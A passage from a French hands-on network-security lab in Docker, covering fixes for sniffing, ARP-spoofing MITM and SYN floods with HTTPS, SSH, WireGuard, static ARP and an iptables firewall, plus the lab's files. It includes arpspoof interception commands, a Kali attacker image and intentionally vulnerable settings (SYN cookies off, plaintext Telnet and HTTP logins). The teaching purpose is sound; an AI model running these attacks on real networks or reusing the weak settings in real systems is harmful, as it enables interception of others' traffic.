> - **Solution :** les SYN cookies. Quand la file est pleine, le serveur encode les informations de la connexion dans son `SYN-ACK` et **ne réserve rien**. Seul un client qui renvoie le `ACK` obtient une connexion. Contre un DDoS volumétrique qui sature le lien, il faut en plus filtrer en amont (FAI, service anti-DDoS).

---

### 4. Corriger le sniffing : HTTPS et SSH

#### 4.1 Passer l'intranet en HTTPS

**Rappel du problème :** lors de l'écoute par la sonde (exercice 1), `user=alice&password=Ete2026!` et le cookie de session circulaient en clair.

1. **Créez le certificat du serveur**, directement dans le conteneur `serveur` :
   ```powershell
   docker compose exec serveur sh -c "mkdir -p /app/certs && openssl req -x509 -newkey rsa:2048 -nodes -days 365 -keyout /app/certs/intranet.key -out /app/certs/intranet.crt -subj /CN=intranet.lab -addext subjectAltName=DNS:intranet.lab,IP:10.10.0.10,IP:10.99.0.1"
   docker compose exec serveur openssl x509 -in /app/certs/intranet.crt -noout -subject -ext subjectAltName
   ```
   → **`subject=CN=intranet.lab` et `DNS:intranet.lab, IP Address:10.10.0.10, IP Address:10.99.0.1`.** L'adresse 10.99.0.1 servira au VPN de la correction 5. Les fichiers apparaissent dans `lab7\serveur\certs`.

2. **Faites confiance à ce certificat côté client.** Il est auto-signé : aucune autorité publique ne le garantit. On le dépose donc chez la victime, qui l'utilisera comme seule autorité de confiance :
   ```powershell
   cp serveur/certs/intranet.crt victime/intranet.crt
   ```

3. **Activez TLS dans `serveur/web.py`** :
   - Dans `do_POST`, durcissez le cookie :
     ```python
     [("Set-Cookie", f"session={sid}; Path=/; Secure; HttpOnly")])
     ```
   - Remplacez la **dernière ligne** du fichier, `Server(("0.0.0.0", 80), Handler).serve_forever()`, par :
     ```python
     import ssl

     httpd = Server(("0.0.0.0", 443), Handler)
     ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
     ctx.minimum_version = ssl.TLSVersion.TLSv1_2
     ctx.load_cert_chain("/app/certs/intranet.crt", "/app/certs/intranet.key")
     httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True, do_handshake_on_connect=False)
     httpd.serve_forever()
     ```

4. **Mettez à jour la victime** : remplacez le contenu de `victime/victime.py` par la [version 2 de l'annexe](#victimevictimepy-version-2). Elle se connecte en HTTPS, utilise SSH à la place de Telnet, et emprunte le VPN quand il existe.
   ```powershell
   docker compose restart serveur victime
   docker compose logs --tail 4 victime
   ```
   → **`HTTPS ok via 10.10.0.10`.** La ligne `ssh_session ÉCHEC` est **normale** : SSH sera configuré en 4.2.

5. **Vérifiez** en rejouant l'écoute par la sonde, sur le port 443 cette fois :
   ```powershell
   docker compose run --rm sonde sh -c "tcpdump -i br-lab -A -n -l 'tcp port 443' | grep -E 'user=|password|Cookie'"
   ```
   → **Rien ne s'affiche.** Enregistrez aussi une capture et ouvrez-la dans Wireshark avec le filtre `tls` :
   ```powershell
   docker compose run --rm sonde sh -c "timeout 30 tcpdump -U -i br-lab -w - > /captures/https.pcap"
   ```
   → **Seuls `Client Hello`, `Server Hello`, puis des `Application Data` illisibles apparaissent.** L'alerte IDS `1000001` ne se déclenche plus.

6. **Testez un client qui ne fait pas confiance au certificat :**
   ```powershell
   docker compose exec attaquant sh -c 'curl -s https://10.10.0.10/; echo code retour : $?'
   ```
   → **`code retour : 60`** : curl refuse un certificat qu'il ne peut pas vérifier. Un attaquant qui se placerait au milieu avec son propre certificat provoquerait la même erreur chez la victime.

> **Bilan du fix : HTTPS**
> - **Problème :** le mot de passe et le cookie de session de l'intranet étaient lisibles par quiconque captait le trafic.
> - **Cause :** HTTP transporte tout en clair.
> - **Solution :** HTTPS (HTTP dans TLS), avec un certificat que le client sait vérifier. Le cookie est marqué `Secure` (jamais envoyé en HTTP) et `HttpOnly` (inaccessible au JavaScript). Le certificat est lié au **nom** du serveur : un faux serveur ne peut pas en présenter un valide pour ce nom.

#### 4.2 Remplacer Telnet par SSH

**Rappel du problème :** dans la capture `sniffing.pcap` (exercice 1), `Password: R0uteur!26` était lisible dans le flux Telnet.

1. **Créez la console du routeur pour SSH** : `serveur/console.py`. C'est la même console que celle de `telnet.py`, mais lancée par SSH : elle lit les commandes tapées et y répond.
   ```python
   import sys

   CONFIG = ("hostname R1\n"
             "interface Gi0/0\n"
             " ip address 10.10.0.1 255.255.255.0\n"
             "snmp-server community public RO\n")


   def prompt():
       sys.stdout.write("routeur> ")
       sys.stdout.flush()


   print("Routeur R1 - acces d'administration (SSH)")
   prompt()
   for line in sys.stdin:
       cmd = line.strip()
       if cmd in ("exit", "quit"):
           print("Bye")
           break
       if cmd == "show running-config":
           sys.stdout.write(CONFIG)
       elif cmd:
           print("% Commande inconnue")
       prompt()
   ```

2. **Créez la paire de clés de l'administratrice**, dans le conteneur `victime`, puis déposez la clé publique sur le serveur :
   ```powershell
   docker compose exec victime sh -c "mkdir -p /app/keys && ssh-keygen -t ed25519 -N '' -C admin@victime -f /app/keys/id_ed25519"
   mkdir serveur/keys
   cp victime/keys/id_ed25519.pub serveur/keys/admin.pub
   ```
   → **Deux fichiers dans `lab7\victime\keys` : `id_ed25519` (clé privée, qui ne quitte jamais le poste) et `id_ed25519.pub` (clé publique, déposée sur le serveur).**

3. **Durcissez le serveur SSH** : créez `serveur/sshd_lab.conf` :
   ```
   PermitRootLogin no
   PasswordAuthentication no
   KbdInteractiveAuthentication no
   AllowUsers admin
   ForceCommand /usr/local/bin/python3 /app/console.py
   ```

4. **Démarrez SSH et arrêtez Telnet** : dans `docker-compose.yml`, ajoutez au service `serveur` :
   ```yaml
       command: >
         sh -c "tr -d '\r' < /app/sshd_lab.conf > /etc/ssh/sshd_config.d/lab.conf &&
                install -o admin -g admin -m 600 /app/keys/admin.pub /home/admin/.ssh/authorized_keys &&
                /usr/sbin/sshd &&
                exec python3 -u /app/web.py"
   ```
   ```powershell
   docker compose up -d serveur
   ```
   `telnet.py` n'est plus lancé : le port 23 est fermé.

5. **Vérifiez l'empreinte du serveur avant de lui faire confiance.**

   > **Pourquoi ?** L'**empreinte** est un résumé de la clé publique du serveur. À la première connexion, votre poste ne la connaît pas : rien ne prouve que vous parlez au vrai serveur et pas à un attaquant placé au milieu. On la compare donc avec celle que l'administrateur a relevée **sur le serveur lui-même** et transmise par un autre canal. Si elles sont identiques, la clé est enregistrée dans `known_hosts`. Ensuite, SSH compare tout seul à chaque connexion. Si la clé change, il affiche `REMOTE HOST IDENTIFICATION HAS CHANGED` et refuse la connexion : soit le serveur a été réinstallé, soit quelqu'un se fait passer pour lui.

   ```powershell
   docker compose exec victime sh -c "ssh-keyscan -t ed25519 10.10.0.10 2>/dev/null | sed 's/^10.10.0.10/routeur-r1/' > /app/keys/known_hosts"
   docker compose exec victime ssh-keygen -lf /app/keys/known_hosts
   docker compose exec serveur ssh-keygen -lf /etc/ssh/ssh_host_ed25519_key.pub
   ```
   → **Les deux dernières commandes affichent la même empreinte `SHA256:...`.** La première est ce que le réseau annonce, la seconde est lue directement sur le serveur.

   `docker compose logs --tail 4 victime` → **`HTTPS ok via 10.10.0.10` et `SSH ok via 10.10.0.10`.**

6. **Vérifiez :**
   ```powershell
   docker compose run --rm sonde sh -c "tcpdump -i br-lab -A -n -l 'tcp port 22' | grep -E 'Password|R0uteur|show'"
   docker compose exec victime ssh -o StrictHostKeyChecking=no -o BatchMode=yes admin@10.10.0.10
   ```
   → **`tcpdump` n'affiche rien** : seule la bannière `SSH-2.0-OpenSSH_...` circule en clair, le reste est chiffré. Sans la clé privée (ici, on ne la donne pas à `ssh`), la connexion échoue : **`Permission denied (publickey)`**. L'alerte IDS `1000002` ne se déclenche plus.

> **Bilan du fix : SSH**
> - **Problème :** le mot de passe du routeur et toute la session d'administration étaient lisibles.
> - **Cause :** Telnet n'a ni chiffrement ni authentification du serveur.
> - **Solution :** SSH, qui chiffre la session et authentifie le serveur par sa clé (empreinte vérifiée, puis mémorisée dans `known_hosts`). Durcissement : authentification par clé uniquement, pas de connexion root, comptes autorisés limités.

---

### 5. Corriger le MITM : VPN et ARP statique

Avec HTTPS et SSH, l'attaquant placé au milieu ne lit plus les contenus. Il voit pourtant encore **qui parle à qui, sur quels services et quand**, et il peut toujours se placer au milieu. Vérifiez-le : l'ARP spoofing tourne 20 secondes en arrière-plan (`-d`) pendant que l'attaquant écoute depuis son poste.

```powershell
docker compose exec -d attaquant timeout 20 arpspoof -i eth0 -t 10.10.0.20 -r 10.10.0.10
docker compose exec attaquant timeout 15 tcpdump -i eth0 -n 'not arp'
```
→ **Des lignes `10.10.0.20.xxxxx > 10.10.0.10.443` et `10.10.0.20.xxxxx > 10.10.0.10.22`** : l'attaquant sait que la victime utilise l'intranet et administre le routeur.

#### 5.1 Monter un tunnel WireGuard

1. **Générez une paire de clés pour chaque extrémité :**
   ```powershell
   docker compose exec serveur sh -c 'k=$(wg genkey); echo privee: $k; echo publique: $(echo $k | wg pubkey)'
   docker compose exec victime sh -c 'k=$(wg genkey); echo privee: $k; echo publique: $(echo $k | wg pubkey)'
   ```

2. **Écrivez les deux configurations**, en remplaçant les clés.

   `serveur/wg0.conf`
   ```ini
   [Interface]
   Address = 10.99.0.1/24
   ListenPort = 51820
   PrivateKey = <clé privée du serveur>

   [Peer]
   PublicKey = <clé publique de la victime>
   AllowedIPs = 10.99.0.2/32
   ```

   `victime/wg0.conf`
   ```ini
   [Interface]
   Address = 10.99.0.2/24
   PrivateKey = <clé privée de la victime>

   [Peer]
   PublicKey = <clé publique du serveur>
   Endpoint = 10.10.0.10:51820
   AllowedIPs = 10.99.0.1/32
   PersistentKeepalive = 15
   ```

3. **Montez le tunnel des deux côtés :**
   ```powershell
   docker compose exec serveur sh -c "umask 077 && tr -d '\r' < /app/wg0.conf > /etc/wireguard/wg0.conf && wg-quick up wg0"
   docker compose exec victime sh -c "umask 077 && tr -d '\r' < /app/wg0.conf > /etc/wireguard/wg0.conf && wg-quick up wg0"
   docker compose exec victime wg show
   ```
   → **`latest handshake: x seconds ago`**, puis, dans les logs de la victime, **`HTTPS ok via 10.99.0.1` et `SSH ok via 10.99.0.1`**. Le certificat reste valide, car il contient l'adresse 10.99.0.1.
   > Si `wg-quick` répond `Unknown device type`, le module WireGuard n'est pas chargé. Il est inclus dans Docker Desktop ; sous Linux : `sudo modprobe wireguard`.

4. **Rejouez le MITM :**
   ```powershell
   docker compose exec -d attaquant timeout 20 arpspoof -i eth0 -t 10.10.0.20 -r 10.10.0.10
   docker compose exec attaquant timeout 15 tcpdump -i eth0 -n 'not arp'
   ```
   → **Uniquement des lignes `IP 10.10.0.20.45831 > 10.10.0.10.51820: UDP, length 176`** : l'attaquant est toujours au milieu, mais il ne voit plus qu'un flux UDP chiffré. Il ne sait plus quels services sont utilisés.

> **Bilan du fix : VPN**
> - **Problème :** même avec HTTPS et SSH, l'attaquant au milieu voyait les services utilisés, les volumes et les horaires, et tout protocole resté en clair aurait été exposé.
> - **Cause :** chaque application chiffre son contenu, mais les en-têtes IP et TCP restent visibles sur un réseau qui n'est pas de confiance.
> - **Solution :** un VPN (WireGuard) qui chiffre et authentifie **tout** le trafic entre deux extrémités. Limite : il protège le trajet, pas les machines aux deux bouts.

#### 5.2 Empêcher l'empoisonnement ARP

Le VPN protège le contenu, mais l'attaquant reste au milieu : il pourrait jeter les paquets et couper le service. On fige donc les associations IP/MAC critiques. Attendez la fin de l'ARP spoofing précédent (20 secondes), puis :

PowerShell :
```powershell
$MAC_SRV = docker compose exec -T serveur cat /sys/class/net/eth0/address
$MAC_VIC = docker compose exec -T victime cat /sys/class/net/eth0/address
```
Linux, macOS ou Git Bash :
```bash
MAC_SRV=$(docker compose exec -T serveur cat /sys/class/net/eth0/address)
MAC_VIC=$(docker compose exec -T victime cat /sys/class/net/eth0/address)
```
Puis, dans les deux cas :
```powershell
docker compose exec victime ip neigh replace 10.10.0.10 lladdr $MAC_SRV nud permanent dev eth0
docker compose exec serveur ip neigh replace 10.10.0.20 lladdr $MAC_VIC nud permanent dev eth0
docker compose exec -d attaquant timeout 20 arpspoof -i eth0 -t 10.10.0.20 -r 10.10.0.10
```
Attendez une dizaine de secondes, puis :
```powershell
docker compose exec victime ip neigh show 10.10.0.10
```
→ **`10.10.0.10 dev eth0 lladdr <vraie MAC du serveur> PERMANENT`** : arpspoof envoie toujours ses fausses réponses, mais elles sont ignorées.

> **Bilan du fix : ARP statique**
> - **Problème :** n'importe quelle machine du LAN pouvait détourner le trafic avec de fausses réponses ARP.
> - **Cause :** ARP accepte les réponses sans aucune vérification, même non sollicitées.
> - **Solution ici :** des entrées ARP statiques pour les machines critiques. **En entreprise**, cette méthode ne passe pas à l'échelle : on active sur les switchs le **DHCP snooping** et la **Dynamic ARP Inspection (DAI)**. Le switch note quelle IP le serveur DHCP a donnée à quelle MAC, et jette toute réponse ARP qui ne correspond pas. On ajoute l'authentification des postes avec **802.1X**.

---

### 6. Fermer ce qui n'a pas à être ouvert : pare-feu

1. **Constatez le problème.** Depuis l'attaquant, contactez le port SSH du serveur :
   ```powershell
   docker compose exec attaquant curl -s --max-time 3 telnet://10.10.0.10:22
   ```
   → **`SSH-2.0-OpenSSH_...` s'affiche** : le serveur répond. N'importe quelle machine du LAN atteint SSH, alors que seule l'administratrice en a besoin, et uniquement par le VPN.

2. **Écrivez la politique** dans `serveur/firewall.sh` :
   ```sh
   #!/bin/sh
   # Pare-feu du serveur : on ouvre le strict nécessaire, puis on refuse tout le reste
   iptables -F INPUT
   iptables -A INPUT -i lo -j ACCEPT
   iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT              # réponses (stateful)
   iptables -A INPUT -p icmp -j ACCEPT
   iptables -A INPUT -i eth0 -p tcp --dport 443 -s 10.10.0.0/24 -j ACCEPT              # intranet : tout le LAN
   iptables -A INPUT -i eth0 -p udp --dport 51820 -s 10.10.0.20 -j ACCEPT              # VPN : poste admin seulement
   iptables -A INPUT -i wg0 -p tcp -m multiport --dports 22,443 -s 10.99.0.2 -j ACCEPT # SSH : uniquement dans le tunnel
   iptables -P INPUT DROP                                                              # en dernier, pour ne pas se couper
   iptables -L INPUT -n --line-numbers
   ```
   Appliquez-la :
   ```powershell
   docker compose exec serveur sh -c "tr -d '\r' < /app/firewall.sh | sh"
   ```
   → **`Chain INPUT (policy DROP)`, suivi de vos 6 règles dans l'ordre.**

3. **Vérifiez :**
   ```powershell
   docker compose exec attaquant curl -s --max-time 3 telnet://10.10.0.10:22
   docker compose exec attaquant curl -sk -o /dev/null -w '%{http_code}\n' https://10.10.0.10/
   docker compose logs --tail 2 victime
   ```
   → **SSH depuis l'attaquant : plus aucune bannière, la commande s'arrête après 3 secondes.** L'intranet reste accessible à tout le LAN (**`200`**), comme prévu. La victime affiche toujours **`HTTPS ok via 10.99.0.1`** et **`SSH ok via 10.99.0.1`**.

> **Bilan du fix : pare-feu**
> - **Problème :** tous les services du serveur étaient joignables par toutes les machines du réseau, y compris l'attaquant.
> - **Cause :** aucune politique de filtrage : tout ce qui n'était pas interdit était autorisé.
> - **Solution :** un pare-feu en politique **DROP par défaut**, qui n'ouvre que le nécessaire, à qui en a besoin (SSH uniquement dans le tunnel, VPN uniquement depuis le poste admin), avec le suivi d'état pour laisser passer les réponses. Pour garder les règles après un redémarrage : `iptables-save`.

---

### 7. À rendre

1. Les captures `sniffing.pcap` et `mitm.pcap`, avec une capture d'écran d'un flux Telnet suivi dans Wireshark.
2. Les sorties de `ip neigh` sur la victime : avant l'ARP spoofing, pendant, et après l'ARP statique (`PERMANENT`).
3. Les réponses aux questions et le tableau du bilan de l'exercice 1.
4. `suricata/rules/local.rules` et `suricata/rules/ips.rules`, avec un extrait de `fast.log` par règle déclenchée, classé en vrai ou faux positif.
5. Les deux empreintes SSH identiques, et la sortie de `tcpdump` réduite à de l'UDP 51820.
6. `serveur/firewall.sh`, et la preuve que l'attaquant n'atteint plus le port 22.
7. Pour chaque correction de l'exercice 2, **en vos propres mots** : où était le problème, pourquoi, et quelle est la solution.

**Nettoyage :** `docker compose --profile ids --profile ips down`

---

# Annexe : fichiers du lab

Ces fichiers sont **déjà dans le dossier `lab7`** : ils sont donnés ici pour référence. Seule la version 2 de `victime/victime.py` est à mettre en place, pendant l'exercice 2.

```
lab7/
├── docker-compose.yml
├── serveur/
│   ├── Dockerfile
│   ├── web.py
│   └── telnet.py
├── victime/
│   ├── Dockerfile
│   └── victime.py
├── attaquant/
│   └── Dockerfile
└── suricata/
    └── Dockerfile
```

Ces fichiers sont fournis dans le dossier `lab7` : ils sont reproduits ici pour référence. Les autres fichiers (règles, certificats, `console.py`, `wg0.conf`, `firewall.sh`…) sont créés pendant l'exercice 2.

### `docker-compose.yml`

```yaml
name: lab7

services:
  serveur:
    build: ./serveur
    container_name: serveur
    hostname: serveur
    cap_add:
      - NET_ADMIN                       # iptables, ARP statique, WireGuard
    networks:
      lan:
        ipv4_address: 10.10.0.10
    volumes:
      - ./serveur:/app
    sysctls:
      # Volontairement vulnérable pour l'exercice 1 (corrigé à l'exercice 2, correction 3)
      net.ipv4.tcp_syncookies: "0"
      net.ipv4.tcp_max_syn_backlog: "128"
    # Exercice 2, correction 4.2 : ajouter ici le bloc « command »

  victime:
    build: ./victime
    container_name: victime
    hostname: victime
    cap_add:
      - NET_ADMIN
    networks:
      lan:
        ipv4_address: 10.10.0.20
    volumes:
      - ./victime:/app
    depends_on:
      - serveur

  attaquant:
    build: ./attaquant
    container_name: attaquant
    hostname: attaquant
    cap_add:
      - NET_ADMIN
      - NET_RAW
    networks:
      lan:
        ipv4_address: 10.10.0.66
    sysctls:
      net.ipv4.ip_forward: "1"
    volumes:
      - ./captures:/captures

  # Sonde de capture branchée sur le switch virtuel (port miroir), lancée à la demande
  sonde:
    build: ./attaquant
    profiles: ["outils"]
    network_mode: host
    cap_add:
      - NET_ADMIN
      - NET_RAW
    volumes:
      - ./captures:/captures

  # Exercice 2, correction 1 : IDS en dérivation sur le switch virtuel
  ids:
    build: ./suricata
    profiles: ["ids"]
    network_mode: host
    cap_add:
      - NET_ADMIN
      - NET_RAW
    volumes:
      - ./suricata/rules:/rules:ro
      - ./logs/ids:/var/log/suricata
    command: >
      sh -c "tr -d '\r' < /rules/local.rules > /tmp/local.rules &&
             exec suricata -S /tmp/local.rules -i br-lab -k none"

  # Exercice 2, correction 2 : IPS en coupure, partage la pile réseau du serveur
  ips:
    build: ./suricata
    profiles: ["ips"]
    network_mode: "service:serveur"
    cap_add:
      - NET_ADMIN
      - NET_RAW
    volumes:
      - ./suricata/rules:/rules:ro
      - ./logs/ips:/var/log/suricata
    command: >
      sh -c "iptables -C INPUT -p tcp -j NFQUEUE --queue-num 0 2>/dev/null || iptables -A INPUT -p tcp -j NFQUEUE --queue-num 0;
             iptables -C OUTPUT -p tcp -j NFQUEUE --queue-num 0 2>/dev/null || iptables -A OUTPUT -p tcp -j NFQUEUE --queue-num 0;
             tr -d '\r' < /rules/ips.rules > /tmp/ips.rules &&
             exec suricata -q 0 -S /tmp/ips.rules -k none"

networks:
  lan:
    internal: true                      # réseau isolé : aucun accès à Internet
    driver_opts:
      com.docker.network.bridge.name: br-lab
    ipam:
      config:
        - subnet: 10.10.0.0/24
          gateway: 10.10.0.1
```

### `serveur/Dockerfile`

Les scripts du serveur ne sont pas copiés dans l'image : le dossier `serveur` est partagé avec le conteneur (`/app`).

```dockerfile
FROM python:3.12-slim
RUN apt-get update \
 && apt-get install -y --no-install-recommends \
      iproute2 iptables openssh-server wireguard-tools openssl \
 && rm -rf /var/lib/apt/lists/* \
 && mkdir -p /run/sshd /home/admin/.ssh \
 && useradd -M -d /home/admin -s /bin/sh admin \
 && usermod -p '*' admin \
 && chown -R admin:admin /home/admin \
 && chmod 700 /home/admin/.ssh
CMD ["sh", "-c", "python3 -u /app/telnet.py & exec python3 -u /app/web.py"]
```

### `serveur/web.py`

Intranet minimal : formulaire de connexion en HTTP, cookie de session, page protégée.

```python
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs
import secrets

SESSIONS = set()
FORM = """<html><body><h1>Intranet</h1>
<form method="post" action="/login">
  <input name="user" placeholder="Identifiant">
  <input name="password" type="password" placeholder="Mot de passe">
  <button>Connexion</button>
</form></body></html>""".encode()


class Handler(BaseHTTPRequestHandler):
    def reply(self, code, body, headers=()):
        self.send_response(code)
        for k, v in headers:
            self.send_header(k, v)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        if self.path == "/notes":
            sid = self.headers.get("Cookie", "").removeprefix("session=")
            if sid in SESSIONS:
                return self.reply(200, "<p>Notes internes : réunion budget jeudi.</p>".encode())
            return self.reply(403, b"<p>Non connecte</p>")
        self.reply(200, FORM)

    def do_POST(self):
        size = int(self.headers.get("Content-Length", 0))
        form = parse_qs(self.rfile.read(size).decode())
        if form.get("user") == ["alice"] and form.get("password") == ["Ete2026!"]:
            sid = secrets.token_hex(8)
            SESSIONS.add(sid)
            return self.reply(200, b"<p>Bienvenue alice</p>",
                              [("Set-Cookie", f"session={sid}; Path=/")])
        self.reply(401, b"<p>Identifiants invalides</p>")

    def log_message(self, *args):
        pass


class Server(ThreadingHTTPServer):
    request_queue_size = 128


Server(("0.0.0.0", 80), Handler).serve_forever()
```

### `serveur/telnet.py`

Console Telnet simulée d'un routeur (port 23, en clair).

```python
import socketserver

CONFIG = (b"hostname R1\r\n"
          b"interface Gi0/0\r\n"
          b" ip address 10.10.0.1 255.255.255.0\r\n"
          b"snmp-server community public RO\r\n")


class Console(socketserver.StreamRequestHandler):
    def line(self):
        data = self.rfile.readline(200)
        if not data:
            return None
        # On ignore les octets de négociation Telnet et les caractères non imprimables
        return bytes(b for b in data if 32 <= b < 127).decode().strip()

    def handle(self):
        w = self.wfile.write
        w(b"\r\nRouteur R1 - acces d'administration\r\n\r\nlogin: ")
        user = self.line()
        w(b"Password: ")
        pwd = self.line()
        if (user, pwd) != ("admin", "R0uteur!26"):
            w(b"\r\nLogin incorrect\r\n")
            return
        while True:
            w(b"\r\nrouteur> ")
            cmd = self.line()
            if cmd is None or cmd in ("exit", "quit"):
                w(b"Bye\r\n")
                return
            if cmd == "show running-config":
                w(CONFIG)
            elif cmd:
                w(b"% Commande inconnue")


class Server(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True


Server(("0.0.0.0", 23), Console).serve_forever()
```

### `victime/Dockerfile`

```dockerfile
FROM python:3.12-slim
RUN apt-get update \
 && apt-get install -y --no-install-recommends \
      iproute2 curl openssh-client wireguard-tools \
 && rm -rf /var/lib/apt/lists/*
CMD ["python3", "-u", "/app/victime.py"]
```

### `victime/victime.py` (version 1)

Le robot qui joue alice : toutes les 8 secondes, il se connecte à l'intranet, lit une page protégée, puis se connecte au routeur en Telnet.

```python
import socket
import time
import urllib.parse
import urllib.request

SRV = "10.10.0.10"


def http_session():
    data = urllib.parse.urlencode({"user": "alice", "password": "Ete2026!"}).encode()
    with urllib.request.urlopen(f"http://{SRV}/login", data=data, timeout=5) as r:
        cookie = r.headers.get("Set-Cookie", "").split(";")[0]
    req = urllib.request.Request(f"http://{SRV}/notes", headers={"Cookie": cookie})
    with urllib.request.urlopen(req, timeout=5) as r:
        r.read()
    return "HTTP ok"


def telnet_session():
    with socket.create_connection((SRV, 23), timeout=5) as s:
        def wait_for(token):
            buf = b""
            while token not in buf:
                chunk = s.recv(1024)
                if not chunk:
                    raise ConnectionError("connexion fermée")
                buf += chunk

        wait_for(b"login: ")
        s.sendall(b"admin\r\n")
        wait_for(b"Password: ")
        s.sendall(b"R0uteur!26\r\n")
        wait_for(b"routeur> ")
        s.sendall(b"show running-config\r\n")
        wait_for(b"routeur> ")
        s.sendall(b"exit\r\n")
    return "Telnet ok"


while True:
    for task in (http_session, telnet_session):
        stamp = time.strftime("%H:%M:%S")
        try:
            print(stamp, task(), flush=True)
        except Exception as e:
            print(stamp, task.__name__, "ÉCHEC :", e, flush=True)
    time.sleep(8)
```

### `victime/victime.py` (version 2)

À mettre en place à l'exercice 2, correction 4.1, à la place de la version 1.

```python
import os
import shutil
import ssl
import subprocess
import time
import urllib.parse
import urllib.request

KEY = "/tmp/id_ed25519"


def srv():
    # Si le tunnel VPN existe (exercice 2, correction 5), on passe par lui
    return "10.99.0.1" if os.path.exists("/sys/class/net/wg0") else "10.10.0.10"


def http_session():
    ctx = ssl.create_default_context(cafile="/app/intranet.crt")   # seule AC de confiance
    base = f"https://{srv()}"
    data = urllib.parse.urlencode({"user": "alice", "password": "Ete2026!"}).encode()
    with urllib.request.urlopen(f"{base}/login", data=data, timeout=5, context=ctx) as r:
        cookie = r.headers.get("Set-Cookie", "").split(";")[0]
    req = urllib.request.Request(f"{base}/notes", headers={"Cookie": cookie})
    with urllib.request.urlopen(req, timeout=5, context=ctx) as r:
        r.read()
    return f"HTTPS ok via {srv()}"


def ssh_session():
    # ssh exige une clé privée lisible par son seul propriétaire : on en fait une copie protégée
    shutil.copyfile("/app/keys/id_ed25519", KEY)
    os.chmod(KEY, 0o600)
    r = subprocess.run(
        ["ssh", "-i", KEY,
         "-o", "BatchMode=yes",
         "-o", "StrictHostKeyChecking=yes",
         "-o", "UserKnownHostsFile=/app/keys/known_hosts",
         "-o", "HostKeyAlias=routeur-r1",
         "-o", "ConnectTimeout=5",
         f"admin@{srv()}"],
        input=b"show running-config\nexit\n", capture_output=True, timeout=10)
    if r.returncode != 0 or b"hostname R1" not in r.stdout:
        raise ConnectionError(r.stderr.decode(errors="ignore").strip()[-90:] or "échec")
    return f"SSH ok via {srv()}"


while True:
    for task in (http_session, ssh_session):
        stamp = time.strftime("%H:%M:%S")
        try:
            print(stamp, task(), flush=True)
        except Exception as e:
            print(stamp, task.__name__, "ÉCHEC :", e, flush=True)
    time.sleep(8)
```

### `attaquant/Dockerfile`

Image officielle Kali Linux, avec les outils du lab. Elle sert à la fois pour le conteneur `attaquant` et pour la `sonde`.

```dockerfile
FROM kalilinux/kali-rolling
RUN apt-get update \
 && DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends \
      dsniff tcpdump tshark hping3 iproute2 iputils-ping curl telnet \
 && rm -rf /var/lib/apt/lists/*
CMD ["sleep", "infinity"]
```

### `suricata/Dockerfile`

```dockerfile
FROM debian:trixie-slim
RUN apt-get update \
 && apt-get install -y --no-install-recommends suricata iptables \
 && rm -rf /var/lib/apt/lists/*
```
